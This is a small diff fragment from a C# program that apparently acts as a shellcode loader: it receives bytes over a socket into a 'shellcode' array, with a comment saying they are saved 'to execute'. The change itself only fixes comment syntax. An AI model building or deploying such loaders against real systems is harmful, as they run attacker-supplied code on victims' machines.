@@ -58,7 +58,7 @@ class Program
         byte[] bytes = new byte[1024];
         byte[] shellcode;
 
-	#Save the incomming bytes to a byte array to execute
+	//Save the incomming bytes to a byte array to execute
         while (true)
         {
             int bytesRec = handler.Receive(bytes);
